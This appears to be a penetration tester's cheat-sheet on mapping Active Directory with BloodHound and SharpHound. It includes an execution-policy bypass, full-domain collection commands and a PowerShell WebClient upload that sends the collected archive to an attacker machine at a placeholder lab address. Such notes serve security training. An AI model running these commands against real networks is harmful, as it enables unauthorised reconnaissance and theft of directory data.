## Bloodhound / Neo4j 
```
sudo neo4j start
sudo bloodhound 

PS C:\Users\wint3rmute> . .\SharpHound.ps1 <- You can optionally import the module with dot sourcing
Import-Module .\SharpHound.ps1

Now you can execute Invoke-BloodHound by providing All to -CollectionMethod to invoke all available collection methods.
PS C:\Users\wint3rmute> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Temp

Exfiltrate the generated .zip file archive to your Kali machine then start neo4j and BloodHound. 
Once BloodHound is started, we'll upload the zip archive with the Upload Data function.
Once the upload is finished, we can start the enumeration of the AD environment with BloodHound.

Powershell File Upload
start apache
sudo systemctl start apache2
powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.x/upload.php', 'bloodhound.zip')




Bloodhound
BloodHound is used to create a mapping of Active directory environment which allows us as an attacker to better understand the posture of target infrastructure. 
It maps trusts,permissions , groups users and make our further pentesting more deep.

We will be using a powershell script used to receive information from target known as SharpHound which is part of Bloodhound project
    First run neo4j console on our machine
    neo4j console credentials neo4j:neo4j

go to localhost address and first click run button then add the above credentials which are default
I changed on my machine neo4j : hello

    Now on target we First bypasss powershell execution policy
    powershell -ep bypass
    Run SharpHound.ps1
    . .\SharpHound.ps1

    Now after importing the module in powershell session we will retreive all the info
    Invoke-Bloodhound -CollectionMethod All -Domain domain.name -ZipFileName info.zip

    Transfer the file back to our machine
    Now type bloodhound on our machine

    Give same credentials as neo4j neo4j : hello
    NOw upload the zip file on bloodhound console
    Now simply click analysis and click any type of query and we can see graph of AD
    We can view varius types of permissions etc
```
